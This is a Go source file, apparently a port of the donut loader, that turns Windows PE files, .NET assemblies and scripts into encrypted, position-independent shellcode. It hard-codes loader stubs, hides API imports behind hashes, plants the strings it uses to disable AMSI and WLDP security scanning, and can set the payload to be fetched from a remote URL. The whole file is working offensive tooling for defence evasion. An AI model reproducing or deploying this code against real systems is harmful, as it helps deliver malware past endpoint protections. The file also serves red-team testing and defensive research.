package donut

import (
	"bytes"
	"encoding/binary"
	"io/ioutil"
	"log"
	"path/filepath"
	"strings"

	"github.com/Binject/debug/pe"
)

/*
	This code imports PE files and converts them to shellcode using the algorithm and stubs taken
	from the donut loader: https://github.com/TheWover/donut

	You can also use the native-code donut tools to do this conversion.

	This has the donut stubs hard-coded as arrays, so if something rots,
	try updating the stubs to latest donut first.
*/

// ShellcodeFromURL - Downloads a PE from URL, makes shellcode
func ShellcodeFromURL(fileURL string, config *DonutConfig) (*bytes.Buffer, error) {
	buf, err := DownloadFile(fileURL)
	if err != nil {
		return nil, err
	}
	// todo: set things up in config
	return ShellcodeFromBytes(buf, config)
}

// DetectDotNet - returns true if a .NET assembly. 2nd return value is detected version string.
func DetectDotNet(filename string) (bool, string) {
	// auto-detect .NET assemblies and version
	pefile, err := pe.Open(filename)
	if err != nil {
		return false, ""
	}
	defer pefile.Close()
	return pefile.IsManaged(), pefile.NetCLRVersion()
}

// ShellcodeFromFile - Loads PE from file, makes shellcode
func ShellcodeFromFile(filename string, config *DonutConfig) (*bytes.Buffer, error) {

	switch strings.ToLower(filepath.Ext(filename)) {
	case ".exe":
		dotNetMode, dotNetVersion := DetectDotNet(filename)
		if dotNetMode {
			config.Type = DONUT_MODULE_NET_EXE
		} else {
			config.Type = DONUT_MODULE_EXE
		}
		if dotNetVersion != "" && config.Runtime == "" {
			config.Runtime = dotNetVersion
		}
	case ".dll":
		dotNetMode, dotNetVersion := DetectDotNet(filename)
		if dotNetMode {
			config.Type = DONUT_MODULE_NET_DLL
		} else {
			config.Type = DONUT_MODULE_DLL
		}
		if dotNetVersion != "" && config.Runtime == "" {
			config.Runtime = dotNetVersion
		}
	case ".xsl":
		config.Type = DONUT_MODULE_XSL
	case ".js":
		config.Type = DONUT_MODULE_JS
	case ".vbs":
		config.Type = DONUT_MODULE_VBS
	}

	b, err := ioutil.ReadFile(filename)
	if err != nil {
		return nil, err
	}
	return ShellcodeFromBytes(bytes.NewBuffer(b), config)
}

// ShellcodeFromBytes - Passed a PE as byte array, makes shellcode
func ShellcodeFromBytes(buf *bytes.Buffer, config *DonutConfig) (*bytes.Buffer, error) {

	if err := CreateModule(config, buf); err != nil {
		return nil, err
	}
	instance, err := CreateInstance(config)
	if err != nil {
		return nil, err
	}
	// If the module will be stored on a remote server
	if config.InstType == DONUT_INSTANCE_URL {
		if config.Verbose {
			log.Printf("Saving %s to disk.\n", config.ModuleName)
		}

		// save the module to disk using random name
		instance.Write([]byte{0, 0, 0, 0, 0, 0, 0, 0})          // mystery padding
		config.ModuleData.Write([]byte{0, 0, 0, 0, 0, 0, 0, 0}) // mystery padding
		ioutil.WriteFile(config.ModuleName, config.ModuleData.Bytes(), 0644)
	}
	//ioutil.WriteFile("newinst.bin", instance.Bytes(), 0644)
	return Sandwich(config.Arch, instance)
}

// Sandwich - adds the donut prefix in the beginning (stomps DOS header), then payload, then donut stub at the end
func Sandwich(arch DonutArch, payload *bytes.Buffer) (*bytes.Buffer, error) {
	/*
			Disassembly:
					   0:  e8 					call $+
					   1:  xx xx xx xx			instance length
					   5:  [instance]
		 x=5+instanceLen:  0x59					pop ecx
		             x+1:  stub preamble + stub (either 32 or 64 bit or both)
	*/

	w := new(bytes.Buffer)
	instanceLen := uint32(payload.Len())
	w.WriteByte(0xE8)
	binary.Write(w, binary.LittleEndian, instanceLen)
	if _, err := payload.WriteTo(w); err != nil {
		return nil, err
	}
	w.WriteByte(0x59)

	picLen := int(instanceLen) + 32

	switch arch {
	case X32:
		w.WriteByte(0x5A) // preamble: pop edx, push ecx, push edx
		w.WriteByte(0x51)
		w.WriteByte(0x52)
		w.Write(LOADER_EXE_X86)
		picLen += len(LOADER_EXE_X86)
	case X64:
		w.Write(LOADER_EXE_X64)
		picLen += len(LOADER_EXE_X64)
	case X84:
		w.WriteByte(0x31) // preamble: xor eax,eax
		w.WriteByte(0xC0)
		w.WriteByte(0x48) // dec ecx
		w.WriteByte(0x0F) // js dword x86_code (skips length of x64 code)
		w.WriteByte(0x88)
		binary.Write(w, binary.LittleEndian, uint32(len(LOADER_EXE_X64)))
		w.Write(LOADER_EXE_X64)

		w.Write([]byte{0x5A, // in between 32/64 stubs: pop edx
			0x51,  // push ecx
			0x52}) // push edx
		w.Write(LOADER_EXE_X86)
		picLen += len(LOADER_EXE_X86)
		picLen += len(LOADER_EXE_X64)
	}

	lb := w.Len()
	for i := 0; i < picLen-lb; i++ {
		w.WriteByte(0x0)
	}

	return w, nil
}

// CreateModule - Creates the Donut Module from Config
func CreateModule(config *DonutConfig, inputFile *bytes.Buffer) error {

	mod := new(DonutModule)
	mod.ModType = uint32(config.Type)
	mod.Thread = uint32(config.Thread)
	mod.Unicode = uint32(config.Unicode)
	mod.Compress = uint32(config.Compress)

	if config.Type == DONUT_MODULE_NET_DLL ||
		config.Type == DONUT_MODULE_NET_EXE {
		if config.Domain == "" && config.Entropy != DONUT_ENTROPY_NONE { // If no domain name specified, generate a random one
			config.Domain = RandomString(DONUT_DOMAIN_LEN)
		} else {
			config.Domain = "AAAAAAAA"
		}
		copy(mod.Domain[:], []byte(config.Domain)[:])

		if config.Type == DONUT_MODULE_NET_DLL {
			if config.Verbose {
				log.Println("Class:", config.Class)
			}
			copy(mod.Cls[:], []byte(config.Class)[:])
			if config.Verbose {
				log.Println("Method:", config.Method)
			}
			copy(mod.Method[:], []byte(config.Method)[:])
		}
		// If no runtime specified in configuration, use default
		if config.Runtime == "" {
			config.Runtime = "v2.0.50727"
		}
		if config.Verbose {
			log.Println("Runtime:", config.Runtime)
		}
		copy(mod.Runtime[:], []byte(config.Runtime)[:])
	} else if config.Type == DONUT_MODULE_DLL && config.Method != "" { // Unmanaged DLL? check for exported api
		if config.Verbose {
			log.Println("DLL function:", config.Method)
		}
		copy(mod.Method[:], []byte(config.Method))
	}
	mod.Zlen = 0 // todo: support compression
	mod.Len = uint32(inputFile.Len())

	if config.Parameters != "" {
		// if type is unmanaged EXE
		if config.Type == DONUT_MODULE_EXE {
			// and entropy is enabled
			if config.Entropy != DONUT_ENTROPY_NONE {
				// generate random name
				copy(mod.Param[:], []byte(RandomString(DONUT_DOMAIN_LEN) + " ")[:])
				copy(mod.Param[DONUT_DOMAIN_LEN+1:], []byte(config.Parameters)[:])
			} else {
				// else set to "AAAA "
				copy(mod.Param[:], []byte("AAAAAAAA ")[:])
				copy(mod.Param[9:], []byte(config.Parameters)[:])
			}
		} else {
			copy(mod.Param[:], []byte(config.Parameters)[:])
		}
	}

	// read module into memory
	b := new(bytes.Buffer)
	mod.WriteTo(b)
	inputFile.WriteTo(b)
	config.ModuleData = b

	// update configuration with pointer to module
	config.Module = mod
	return nil
}

// CreateInstance - Creates the Donut Instance from Config
func CreateInstance(config *DonutConfig) (*bytes.Buffer, error) {

	inst := new(DonutInstance)
	modLen := uint32(config.ModuleData.Len()) // ModuleData is mod struct + input file
	instLen := uint32(3312 + 352 + 8)         //todo: that's how big it is in the C version...
	inst.Bypass = uint32(config.Bypass)

	// if this is a PIC instance, add the size of module
	// that will be appended to the end of structure
	if config.InstType == DONUT_INSTANCE_PIC {
		if config.Verbose {
			log.Printf("The size of module is %v bytes. Adding to size of instance.\n", modLen)
		}
		instLen += modLen
	}

	if config.Entropy == DONUT_ENTROPY_DEFAULT {
		if config.Verbose {
			log.Println("Generating random key for instance")
		}
		tk, err := GenerateRandomBytes(16)
		if err != nil {
			return nil, err
		}
		copy(inst.KeyMk[:], tk)

		tk, err = GenerateRandomBytes(16)
		if err != nil {
			return nil, err
		}
		copy(inst.KeyCtr[:], tk)

		if config.Verbose {
			log.Println("Generating random key for module")
		}
		tk, err = GenerateRandomBytes(16)
		if err != nil {
			return nil, err
		}
		copy(inst.ModKeyMk[:], tk)

		tk, err = GenerateRandomBytes(16)
		if err != nil {
			return nil, err
		}
		copy(inst.ModKeyCtr[:], tk)

		if config.Verbose {
			log.Println("Generating random string to verify decryption")
		}
		sbsig := RandomString(DONUT_SIG_LEN)
		copy(inst.Sig[:], []byte(sbsig))

		if config.Verbose {
			log.Println("Generating random IV for Maru hash")
		}
		iv, err := GenerateRandomBytes(MARU_IV_LEN)
		if err != nil {
			return nil, err
		}
		inst.Iv = binary.LittleEndian.Uint64(iv)

		inst.Mac = Maru(inst.Sig[:], inst.Iv)
	}
	if config.Verbose {
		log.Println("Generating hashes for API using IV:", inst.Iv)
	}

	for cnt, c := range api_imports {
		// calculate hash for DLL string
		dllHash := Maru([]byte(c.Module), inst.Iv)

		// calculate hash for API string.
		// xor with DLL hash and store in instance
		inst.Hash[cnt] = Maru([]byte(c.Name), inst.Iv) ^ dllHash

		if config.Verbose {
			log.Printf("Hash for %s : %s = %x\n",
				c.Module,
				c.Name,
				inst.Hash[cnt])
		}
	}
	// save how many API to resolve
	inst.ApiCount = uint32(len(api_imports))
	copy(inst.DllNames[:], "ole32;oleaut32;wininet;mscoree;shell32")

	// if module is .NET assembly
	if config.Type == DONUT_MODULE_NET_DLL ||
		config.Type == DONUT_MODULE_NET_EXE {
		if config.Verbose {
			log.Println("Copying GUID structures and DLL strings for loading .NET assemblies")
		}
		copy(inst.XIID_AppDomain[:], xIID_AppDomain[:])
		copy(inst.XIID_ICLRMetaHost[:], xIID_ICLRMetaHost[:])
		copy(inst.XCLSID_CLRMetaHost[:], xCLSID_CLRMetaHost[:])
		copy(inst.XIID_ICLRRuntimeInfo[:], xIID_ICLRRuntimeInfo[:])
		copy(inst.XIID_ICorRuntimeHost[:], xIID_ICorRuntimeHost[:])
		copy(inst.XCLSID_CorRuntimeHost[:], xCLSID_CorRuntimeHost[:])
	} else if config.Type == DONUT_MODULE_VBS ||
		config.Type == DONUT_MODULE_JS {

		if config.Verbose {
			log.Println("Copying GUID structures and DLL strings for loading VBS/JS")
		}

		copy(inst.XIID_IUnknown[:], xIID_IUnknown[:])
		copy(inst.XIID_IDispatch[:], xIID_IDispatch[:])
		copy(inst.XIID_IHost[:], xIID_IHost[:])
		copy(inst.XIID_IActiveScript[:], xIID_IActiveScript[:])
		copy(inst.XIID_IActiveScriptSite[:], xIID_IActiveScriptSite[:])
		copy(inst.XIID_IActiveScriptSiteWindow[:], xIID_IActiveScriptSiteWindow[:])
		copy(inst.XIID_IActiveScriptParse32[:], xIID_IActiveScriptParse32[:])
		copy(inst.XIID_IActiveScriptParse64[:], xIID_IActiveScriptParse64[:])

		copy(inst.Wscript[:], "WScript")
		copy(inst.Wscript_exe[:], "wscript.exe")

		if config.Type == DONUT_MODULE_VBS {
			copy(inst.XCLSID_ScriptLanguage[:], xCLSID_VBScript[:])
		} else {
			copy(inst.XCLSID_ScriptLanguage[:], xCLSID_JScript[:])
		}
	}

	// required to disable AMSI
	copy(inst.Clr[:], "clr")
	copy(inst.Amsi[:], "amsi")
	copy(inst.AmsiInit[:], "AmsiInitialize")
	copy(inst.AmsiScanBuf[:], "AmsiScanBuffer")
	copy(inst.AmsiScanStr[:], "AmsiScanString")

	// stuff for PE loader
	if len(config.Parameters) > 0 {
		copy(inst.Dataname[:], ".data")
		copy(inst.Kernelbase[:], "kernelbase")

		copy(inst.CmdSyms[:],
			"_acmdln;__argv;__p__acmdln;__p___argv;_wcmdln;__wargv;__p__wcmdln;__p___wargv")
	}
	if config.Thread != 0 {
		copy(inst.ExitApi[:], "ExitProcess;exit;_exit;_cexit;_c_exit;quick_exit;_Exit")
	}
	// required to disable WLDP
	copy(inst.Wldp[:], "wldp")
	copy(inst.WldpQuery[:], "WldpQueryDynamicCodeTrust")
	copy(inst.WldpIsApproved[:], "WldpIsClassInApprovedList")

	// set the type of instance we're creating
	inst.Type = uint32(int(config.InstType))

	// indicate if we should call RtlExitUserProcess to terminate host process
	inst.ExitOpt = config.ExitOpt
	// set the fork option
	inst.OEP = config.OEP
	// set the entropy level
	inst.Entropy = config.Entropy

	// if the module will be downloaded
	// set the URL parameter and request verb
	if inst.Type == DONUT_INSTANCE_URL {
		if config.ModuleName != "" {
			if config.Entropy != DONUT_ENTROPY_NONE {
				// generate a random name for module
				// that will be saved to disk
				config.ModuleName = RandomString(DONUT_MAX_MODNAME)
				if config.Verbose {
					log.Println("Generated random name for module :", config.ModuleName)
				}
			} else {
				config.ModuleName = "AAAAAAAA"
			}
		}
		if config.Verbose {
			log.Println("Setting URL parameters")
		}
		// append module name
		copy(inst.Url[:], config.URL+"/"+config.ModuleName)
		// set the request verb
		copy(inst.Req[:], "GET")
		if config.Verbose {
			log.Println("Payload will attempt download from:", string(inst.Url[:]))
		}
	}

	inst.Mod_len = uint64(modLen) + 8 //todo: this 8 is from alignment I think?
	inst.Len = instLen
	config.inst = inst
	config.instLen = instLen

	if config.InstType == DONUT_INSTANCE_URL && config.Entropy == DONUT_ENTROPY_DEFAULT {
		if config.Verbose {
			log.Println("encrypting module for download")
		}
		config.ModuleMac = Maru(inst.Sig[:], inst.Iv)
		config.ModuleData = bytes.NewBuffer(Encrypt(
			inst.ModKeyMk[:],
			inst.ModKeyCtr[:],
			config.ModuleData.Bytes()))
		b := new(bytes.Buffer)
		inst.Len = instLen - 8 /* magic padding */
		inst.WriteTo(b)
		for uint32(b.Len()) < instLen-16 /* magic padding */ {
			b.WriteByte(0)
		}
		return b, nil
	}
	// else if config.InstType == DONUT_INSTANCE_PIC
	b := new(bytes.Buffer)
	inst.WriteTo(b)
	if _, err := config.ModuleData.WriteTo(b); err != nil {
		log.Fatal(err)
	}
	for uint32(b.Len()) < config.instLen {
		b.WriteByte(0)
	}
	if config.Entropy != DONUT_ENTROPY_DEFAULT {
		return b, nil
	}
	if config.Verbose {
		log.Println("encrypting instance")
	}
	instData := b.Bytes()
	offset := 4 + // Len uint32
		CipherKeyLen + CipherBlockLen + // Instance Crypt
		4 + // pad
		8 + // IV
		(64 * 8) + // Hashes (64 uuids of len 64bit)
		4 + // exit_opt
		4 + // entropy
		8 // OEP

	encInstData := Encrypt(
		inst.KeyMk[:],
		inst.KeyCtr[:],
		instData[offset:])

	bc := new(bytes.Buffer)
	binary.Write(bc, binary.LittleEndian, instData[:offset]) // unencrypted header
	if _, err := bc.Write(encInstData); err != nil {         // encrypted body
		log.Fatal(err)
	}
	if config.Verbose {
		log.Println("Leaving.")
	}
	return bc, nil
}

// DefaultConfig - returns a default donut config for x32+64, EXE, native binary
func DefaultConfig() *DonutConfig {
	return &DonutConfig{
		Arch:     X84,
		Type:     DONUT_MODULE_EXE,
		InstType: DONUT_INSTANCE_PIC,
		Entropy:  DONUT_ENTROPY_DEFAULT,
		Compress: 1,
		Format:   1,
		Bypass:   3,
	}
}
